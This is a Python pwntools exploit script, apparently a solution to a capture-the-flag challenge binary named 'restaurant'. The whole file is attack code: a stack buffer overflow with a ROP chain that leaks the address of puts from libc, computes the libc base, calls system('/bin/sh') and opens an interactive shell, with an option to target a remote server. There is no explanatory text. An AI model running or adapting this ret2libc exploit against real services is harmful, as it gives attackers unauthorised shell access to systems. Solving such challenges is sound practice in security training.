from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './restaurant'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6")
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# useful gadgets
ret = p64(0x000000000040063e)
pop_rdi = p64(0x00000000004010a3)

# got of libc functions
plt_puts = p64(elf.plt.puts)
got_puts = p64(elf.got.puts)

# crafting payload for leaking libs functions
fill_add = p64(elf.symbols.fill)
padding = 40
payload = b'A'*padding
payload += pop_rdi + got_puts + plt_puts
payload += fill_add

#sending payload
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'> ')
io.sendline(payload)

# extracting payload
result = io.recvline_startswith('Enjoy your')
leak_puts = unpack(result[-6:].ljust(8,b'\x00')) 
info('leak_puts address: %#0x', leak_puts)
info('elf.symbols.magic_door: %#0x', elf.symbols.fill)

# leak = base + offset
# libc.symbols.puts -> offset
libc_base = leak_puts - libc.symbols.puts 
info('Libc base: %#0x', libc_base)
shell = next(libc.search(b'/bin/sh\x00')) 
info('Shell: %#0x', shell)
bin_sh = libc_base + shell
info('/bin/sh address: %#0x', bin_sh)
system = libc_base + libc.symbols.system
info('System Address: %#0x', system)

payload = b'A'*padding
payload += ret
payload += pop_rdi + p64(bin_sh) + p64(system)

io.sendlineafter(b'>', payload)

io.interactive()
